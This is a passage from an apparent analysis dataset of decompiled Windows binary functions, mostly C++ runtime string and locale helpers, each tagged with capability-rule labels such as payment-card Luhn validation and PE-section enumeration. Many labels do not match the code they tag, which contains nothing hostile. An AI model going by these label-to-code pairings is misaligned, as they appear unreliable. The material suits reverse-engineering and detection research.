        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00436e42)\n\nint32_t __cdecl fcn.00436d70(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    puVar5 = &fcn.00436d70::var_40h;\n    uVar7 = 0x436d9c;\n    fcn.00490c10(arg_8h, arg_ch, 0);\n    var_30h = &fcn.00436d70::var_28h;\n    fcn.00490c10(arg_10h, arg_14h, uVar7 & 0xffffff00);\n    iVar1 = var_44h + puVar5;\n    var_2ch = var_2ch + var_30h;\n    puVar6 = var_30h;\n    do {\n        iVar4 = fcn.00436d40(puVar5, puVar6);\n        if (iVar4 != 0) {\ncode_r0x00436e26:\n            if (var_30h != &fcn.00436d70::var_28h) {\n                fcn.004a34c0();\n            }\n            return iVar4;\n        }\n        iVar2 = sub.msvcrt.dll_strlen();\n        iVar2 = puVar5 + iVar2;\n        iVar3 = sub.msvcrt.dll_strlen();\n        iVar3 = puVar6 + iVar3;\n        if ((iVar1 == iVar2) && (var_2ch == iVar3)) goto code_r0x00436e26;\n        if (iVar1 == iVar2) {\n            iVar4 = -1;\n            goto code_r0x00436e26;\n        }\n        if (var_2ch == iVar3) {\n            iVar4 = 1;\n            goto code_r0x00436e26;\n        }\n        puVar5 = iVar2 + 1;\n        puVar6 = iVar3 + 1;\n    } while( true );\n}\n",
        "token_count": 572
    },
    "00437150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00437150(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_wcscoll(param_1, param_2);\n    return iVar1 != 0 | iVar1 >> 0x1e;\n}\n",
        "token_count": 67
    },
    "00437180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00437254)\n\nint32_t __cdecl fcn.00437180(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    puVar6 = &fcn.00437180::var_40h;\n    uVar8 = 0x4371ac;\n    fcn.00493990(arg_8h, arg_ch, 0);\n    var_30h = &fcn.00437180::var_28h;\n    fcn.00493990(arg_10h, arg_14h, uVar8 & 0xffffff00);\n    iVar1 = puVar6 + var_44h * 2;\n    iVar2 = var_30h + var_2ch * 2;\n    puVar7 = var_30h;\n    do {\n        iVar5 = fcn.00437150(puVar6, puVar7);\n        if (iVar5 != 0) {\ncode_r0x00437238:\n            if (var_30h != &fcn.00437180::var_28h) {\n                fcn.004a34c0();\n            }\n            return iVar5;\n        }\n        iVar3 = sub.msvcrt.dll_wcslen();\n        iVar3 = puVar6 + iVar3 * 2;\n        iVar4 = sub.msvcrt.dll_wcslen();\n        iVar4 = puVar7 + iVar4 * 2;\n        if ((iVar1 == iVar3) && (iVar2 == iVar4)) goto code_r0x00437238;\n        if (iVar1 == iVar3) {\n            iVar5 = -1;\n            goto code_r0x00437238;\n        }\n        if (iVar2 == iVar4) {\n            iVar5 = 1;\n            goto code_r0x00437238;\n        }\n        puVar6 = iVar3 + 2;\n        puVar7 = iVar4 + 2;\n    } while( true );\n}\n",
        "token_count": 576
    },
    "00441980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.00441980(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint *arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint64_t uVar3;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    piVar2 = fcn.004a0ae0(arg_1ch + 0x6c);\n    var_30h = &var_28h;\n    var_28h._0_1_ = 0;\n    var_2ch = 0;\n    if (arg_18h == '\\0') {\n        uVar3 = fcn.0043fee0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n    }\n    else {\n        uVar3 = fcn.00440c20(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n    }\n    iVar1 = var_2ch;\n    if (var_2ch != 0) {\n        fcn.00494930(var_2ch, 0);\n        (**(*piVar2 + 0x2c))(var_30h, iVar1 + var_30h, *arg_24h);\n    }\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    return uVar3 & 0xffffffff | (arg_ch & 0xffff0000 | uVar3 >> 0x20 & 0xffff) << 0x20;\n}\n",
        "token_count": 485
    },
    "004446c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004446c0(uint param_1, uint param_2, uint param_3)\n\n{\n    sub.msvcrt.dll_strxfrm(param_1, param_2, param_3);\n    return;\n}\n",
        "token_count": 50
    },
    "00444aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00444aa0(uint param_1, uint param_2, uint param_3)\n\n{\n    sub.msvcrt.dll_wcsxfrm(param_1, param_2, param_3);\n    return;\n}\n",
        "token_count": 51
    },
    "004560c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004560c0(uint param_1, uint param_2, char param_3, int32_t param_4, int32_t param_5, int32_t param_6, \n                 int32_t *param_7)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (param_4 != 0) {\n        iVar1 = fcn.0049d950(param_5, param_3, param_1, param_2, param_6, param_4);\n        iVar3 = 0;\n        iVar2 = *param_7 - (param_4 - param_6);\n        if (iVar2 != 0) {\n            sub.msvcrt.dll_memcpy(iVar1, param_4, iVar2);\n            iVar3 = *param_7 - (param_4 - param_6);\n        }\n        *param_7 = iVar3 + (iVar1 - param_5);\n        return;\n    }\n    iVar1 = fcn.0049d950(param_5, param_3, param_1, param_2, param_6, *param_7 + param_6);\n    *param_7 = iVar1 - param_5;\n    return;\n}\n",
        "token_count": 276
    },
    "00457810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00457810(uint param_1, uint param_2, ushort param_3, int32_t param_4, int32_t param_5, int32_t param_6, \n                 int32_t *param_7)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (param_4 != 0) {\n        iVar4 = param_4 - param_6 >> 1;\n        iVar1 = fcn.0049dab0(param_5, param_3, param_1, param_2, param_6, param_4);\n        iVar3 = 0;\n        iVar2 = *param_7 - iVar4;\n        if (iVar2 != 0) {\n            sub.msvcrt.dll_memcpy(iVar1, param_4, iVar2 * 2);\n            iVar3 = *param_7 - iVar4;\n        }\n        *param_7 = iVar3 + (iVar1 - param_5 >> 1);\n        return;\n    }\n    iVar1 = fcn.0049dab0(param_5, param_3, param_1, param_2, param_6, param_6 + *param_7 * 2);\n    *param_7 = iVar1 - param_5 >> 1;\n    return;\n}\n",
        "token_count": 299
    },
    "00463b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463b40(int32_t *param_1)\n\n{\n    if (0 < *(*param_1 + -4)) {\n        fcn.00465630(0, 0, 0);\n    }\n    *(*param_1 + -4) = 0xffffffff;\n    return;\n}\n",
        "token_count": 70
    },
    "004640a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004640a0(uint param_1)\n\n{\n    fcn.004a34c0(param_1);\n    return;\n}\n",
        "token_count": 34
    },
    "004640c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004640c0(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*0x4f59f4 == 0) {\n        iVar2 = *(param_1 + 8);\n        *(param_1 + 8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = param_1 + 8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.004a34c0(param_1);\n    return;\n}\n",
        "token_count": 155
    },
    "00464770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00464770(uint param_1, int32_t param_2, ushort param_3)\n\n{\n    if (param_2 != 0) {\n        fcn.004647a0(param_2, param_3);\n    }\n    return param_1;\n}\n",
        "token_count": 65
    },
    "00464ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00464ed0(int32_t *param_1, uint32_t param_2, ushort param_3)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    uint32_t uVar4;\n    uint32_t extraout_ECX;\n    uint uStack56;\n    int32_t *piStack36;\n    uint16_t *in_stack_ffffffe8;\n    uint16_t *in_stack_ffffffec;\n    uint32_t uStack16;\n    \n    uVar4 = *(*param_1 + -0xc);\n    if (0x1ffffffe < param_2) {\n        fcn.0049ec30(\"basic_string::resize\");\n        if (uStack16 == 1) {\n            uVar1 = *in_stack_ffffffec;\n            *in_stack_ffffffe8 = uVar1;\n            return uVar1;\n        }\n        if (uStack16 == 0) {\n            return uStack16;\n        }\n    // WARNING: Could not recover jumptable at 0x004278b0. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar4 = (*_sym.imp.msvcrt.dll_memcpy)();\n        return uVar4;\n    }\n    if (param_2 <= uVar4) {\n        if (uVar4 <= param_2) {\n            return param_2;\n        }\n        uVar4 = fcn.00465630(param_2, uVar4 - param_2, 0);\n        return uVar4;\n    }\n    param_2 = param_2 - uVar4;\n    iVar2 = *param_1;\n    if (0x1ffffffeU - *(iVar2 + -0xc) < param_2) {\n        fcn.0049ec30(0x502512);\n        fcn.00464330(uStack56, param_2);\n        return extraout_ECX;\n    }\n    uVar4 = *(iVar2 + -0xc) + param_2;\n    if ((uVar4 < *(iVar2 + -8) || uVar4 == *(iVar2 + -8)) && (*(iVar2 + -4) < 1)) {\n        iVar2 = *param_1;\n        puVar3 = iVar2 + *(iVar2 + -0xc) * 2;\n    }\n    else {\n        fcn.00465500(uVar4);\n        iVar2 = *piStack36;\n        puVar3 = iVar2 + *(iVar2 + -0xc) * 2;\n    }\n    if (param_2 == 1) {\n        *puVar3 = param_3;\n    }\n    else {\n        for (; param_2 != 0; param_2 = param_2 - 1) {\n            *puVar3 = param_3;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    *(iVar2 + -4) = 0;\n    *(iVar2 + -0xc) = uVar4;\n    *(iVar2 + uVar4 * 2) = 0;\n    return 0;\n}\n",
        "token_count": 688
    },
    "00465500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00465500(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar auStack13 [5];\n    \n    iVar5 = *param_1;\n    if (param_2 == *(iVar5 + -8)) {\n        if (*(iVar5 + -4) < 1) {\n            return;\n        }\n        iVar5 = *param_1;\n    }\n    uVar2 = *(iVar5 + -0xc);\n    if (param_2 < uVar2) {\n        param_2 = uVar2;\n    }\n    iVar3 = fcn.004641c0(auStack13, param_2 - uVar2);\n    iVar5 = *param_1;\n    if (*0x4f59f4 == 0) {\n        iVar4 = *(iVar5 + -4);\n        *(iVar5 + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar5 + -4;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        fcn.004a34c0(iVar5 + -0xc);\n    }\n    *param_1 = iVar3;\n    return;\n}\n",
        "token_count": 324
    },
    "00465870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00465870(uint *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = -2;\n    if (param_2 != 0) {\n        iVar1 = sub.msvcrt.dll_wcslen(param_2);\n        iVar1 = param_2 + iVar1 * 2;\n    }\n    uVar2 = fcn.00463c70(param_2, iVar1, param_3, 0);\n    *param_1 = uVar2;\n    return;\n}\n",
        "token_count": 134
    },
    "004658c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004658c0(uint *param_1, int32_t param_2, int32_t param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00463c70(param_2, param_2 + param_3 * 2, param_4, 0);\n    *param_1 = uVar1;\n    return;\n}\n",
        "token_count": 93
    },
    "00465950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00465950(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uchar auStack13 [5];\n    \n    iVar1 = *param_2;\n    if (*(iVar1 + -4) < 0) {\n        iVar1 = fcn.004641c0(auStack13, 0);\n        *param_1 = iVar1;\n        return;\n    }\n    if (*0x4f59f4 == 0) {\n        *(iVar1 + -4) = *(iVar1 + -4) + 1;\n        *param_1 = iVar1;\n        return;\n    }\n    LOCK();\n    *(iVar1 + -4) = *(iVar1 + -4) + 1;\n    *param_1 = iVar1;\n    return;\n}\n",
        "token_count": 185
    },
    "00465b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00465b40(uint *param_1, uint param_2, ushort param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00463b80(param_2, param_3, param_4);\n    *param_1 = uVar1;\n    return;\n}\n",
        "token_count": 79
    },
    "0046ba50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ba50(int32_t *param_1)\n\n{\n    if (0 < *(*param_1 + -4)) {\n        fcn.0046d3b0(0, 0, 0);\n    }\n    *(*param_1 + -4) = 0xffffffff;\n    return;\n}\n",
        "token_count": 73
    },
    "0046bf60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046bf60(uint param_1)\n\n{\n    fcn.004a34c0(param_1);\n    return;\n}\n",
        "token_count": 34
    },
    "0046bf80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046bf80(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*0x4f59f4 == 0) {\n        iVar2 = *(param_1 + 8);\n        *(param_1 + 8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = param_1 + 8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.004a34c0(param_1);\n    return;\n}\n",
        "token_count": 155
    },
    "0046c2f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0046c2f0(int32_t *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    int32_t **extraout_ECX;\n    uint32_t uVar1;\n    \n    uVar1 = *(*param_1 + -0xc) - param_2;\n    if (param_3 < uVar1) {\n        uVar1 = param_3;\n    }\n    if (param_2 <= *(*param_1 + -0xc)) {\n        fcn.0046d3b0(param_2, uVar1, 0);\n        return param_1;\n    }\n    fcn.0049f220(0x5021d4, 0x502291);\n    if ((*extraout_ECX)[-1] < 0) {\n        return *extraout_ECX;\n    }\n    fcn.0046ba50();\n    return *extraout_ECX;\n}\n",
        "token_count": 212
    },
    "0046c5d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0046c5d0(uint param_1, int32_t param_2, char param_3)\n\n{\n    if (param_2 != 0) {\n        fcn.0046c600(param_2, param_3);\n    }\n    return param_1;\n}\n",
        "token_count": 68
    },
    "0046cce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0046cce0(uint32_t *param_1, uint32_t param_2, char param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    uint in_stack_ffffffd8;\n    uint8_t *in_stack_ffffffe8;\n    uint8_t *in_stack_ffffffec;\n    uint32_t uStack16;\n    \n    uVar4 = *(*param_1 - 0xc);\n    if (0x3ffffffc < param_2) {\n        fcn.0049ec30(0x502317);\n        if (uStack16 == 1) {\n            uVar1 = *in_stack_ffffffec;\n            *in_stack_ffffffe8 = uVar1;\n            return uVar1;\n        }\n        if (uStack16 != 0) {\n    // WARNING: Could not recover jumptable at 0x004278b0. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar4 = (*_sym.imp.msvcrt.dll_memcpy)();\n            return uVar4;\n        }\n        return uStack16;\n    }\n    if (param_2 <= uVar4) {\n        if (param_2 < uVar4) {\n            uVar4 = fcn.0046d3b0(param_2, uVar4 - param_2, 0);\n            return uVar4;\n        }\n        return param_2;\n    }\n    param_2 = param_2 - uVar4;\n    uVar4 = *param_1;\n    iVar2 = *(uVar4 - 0xc);\n    if (param_2 <= 0x3ffffffcU - iVar2) {\n        uVar5 = iVar2 + param_2;\n        if ((uVar5 < *(uVar4 - 8) || uVar5 == *(uVar4 - 8)) && (*(uVar4 - 4) < 1)) {\n            pcVar3 = *param_1 + *(*param_1 - 0xc);\n        }\n        else {\n            fcn.0046d280(uVar5);\n            pcVar3 = *param_1 + *(*param_1 - 0xc);\n        }\n        if (param_2 == 1) {\n            *pcVar3 = param_3;\n        }\n        else {\n            sub.msvcrt.dll_memset(pcVar3, param_3, param_2);\n        }\n        uVar4 = *param_1;\n        *(uVar4 - 4) = 0;\n        *(uVar4 - 0xc) = uVar5;\n        *(uVar4 + uVar5) = 0;\n        return uVar4;\n    }\n    fcn.0049ec30(0x502302);\n    fcn.0046c1d0(in_stack_ffffffd8, iVar2);\n    return extraout_ECX;\n}\n",
        "token_count": 670
    },
    "0046d280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0046d280(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar auStack13 [5];\n    \n    iVar5 = *param_1;\n    if (param_2 == *(iVar5 + -8)) {\n        if (*(iVar5 + -4) < 1) {\n            return;\n        }\n        iVar5 = *param_1;\n    }\n    uVar2 = *(iVar5 + -0xc);\n    if (param_2 < uVar2) {\n        param_2 = uVar2;\n    }\n    iVar3 = fcn.0046c080(auStack13, param_2 - uVar2);\n    iVar5 = *param_1;\n    if (*0x4f59f4 == 0) {\n        iVar4 = *(iVar5 + -4);\n        *(iVar5 + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar5 + -4;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        fcn.004a34c0(iVar5 + -0xc);\n    }\n    *param_1 = iVar3;\n    return;\n}\n",
        "token_count": 325
    },
    "0046d600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0046d600(uint *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = -1;\n    if (param_2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(param_2);\n        iVar1 = iVar1 + param_2;\n    }\n    uVar2 = fcn.0046bb70(param_2, iVar1, param_3, 0);\n    *param_1 = uVar2;\n    return;\n}\n",
        "token_count": 130
    },
    "0046d650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0046d650(uint *param_1, int32_t param_2, int32_t param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0046bb70(param_2, param_3 + param_2, param_4, 0);\n    *param_1 = uVar1;\n    return;\n}\n",
        "token_count": 90
    },
    "0046d6c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0046d6c0(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uchar auStack13 [5];\n    \n    iVar1 = *param_2;\n    if (*(iVar1 + -4) < 0) {\n        iVar1 = fcn.0046c080(auStack13, 0);\n        *param_1 = iVar1;\n        return;\n    }\n    if (*0x4f59f4 == 0) {\n        *(iVar1 + -4) = *(iVar1 + -4) + 1;\n        *param_1 = iVar1;\n        return;\n    }\n    LOCK();\n    *(iVar1 + -4) = *(iVar1 + -4) + 1;\n    *param_1 = iVar1;\n    return;\n}\n",
        "token_count": 188
    },
    "0046d8b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0046d8b0(uint *param_1, uint param_2, char param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0046ba90(param_2, param_3, param_4);\n    *param_1 = uVar1;\n    return;\n}\n",
        "token_count": 81
    },
    "0046e0f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e0f0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004a3500(0x44);\n        *puVar4 = 0x50af14;\n        puVar4[1] = 0;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        *(puVar4 + 0x43) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    *(puVar4 + 0x11) = 0x2e;\n    iVar1 = *0x4f6d68;\n    *(*(param_1 + 8) + 0x12) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x50208c;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x14) = 0x50208c;\n    *(*(param_1 + 8) + 0x18) = 0;\n    *(*(param_1 + 8) + 0x1c) = 0x50208c;\n    *(*(param_1 + 8) + 0x20) = 0;\n    *(*(param_1 + 8) + 0x24) = 0x50208c;\n    *(*(param_1 + 8) + 0x28) = 0;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    uVar2 = *0x5064d8;\n    *(*(param_1 + 8) + 0x30) = *0x5064d8;\n    *(*(param_1 + 8) + 0x34) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x38 + iVar3) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 666
    },
    "0046e4d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e4d0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004a3500(0x44);\n        *puVar4 = 0x50af24;\n        puVar4[1] = 0;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        *(puVar4 + 0x43) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    *(puVar4 + 0x11) = 0x2e;\n    iVar1 = *0x4f6d68;\n    *(*(param_1 + 8) + 0x12) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x50208c;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x14) = 0x50208c;\n    *(*(param_1 + 8) + 0x18) = 0;\n    *(*(param_1 + 8) + 0x1c) = 0x50208c;\n    *(*(param_1 + 8) + 0x20) = 0;\n    *(*(param_1 + 8) + 0x24) = 0x50208c;\n    *(*(param_1 + 8) + 0x28) = 0;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    uVar2 = *0x5064d8;\n    *(*(param_1 + 8) + 0x30) = *0x5064d8;\n    *(*(param_1 + 8) + 0x34) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x38 + iVar3) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 666
    },
    "0046e8b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e8b0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004a3500(0x54);\n        puVar4[1] = 0;\n        *puVar4 = 0x50af34;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        puVar4[0xe] = 0;\n        *(puVar4 + 0x52) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    iVar1 = *0x4f6d68;\n    *(puVar4 + 0x12) = 0x2e;\n    *(*(param_1 + 8) + 0x14) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x50208c;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x18) = 0x50208e;\n    *(*(param_1 + 8) + 0x1c) = 0;\n    *(*(param_1 + 8) + 0x20) = 0x50208e;\n    *(*(param_1 + 8) + 0x24) = 0;\n    *(*(param_1 + 8) + 0x28) = 0x50208e;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    *(*(param_1 + 8) + 0x30) = 0;\n    uVar2 = *0x5064d8;\n    *(*(param_1 + 8) + 0x34) = *0x5064d8;\n    *(*(param_1 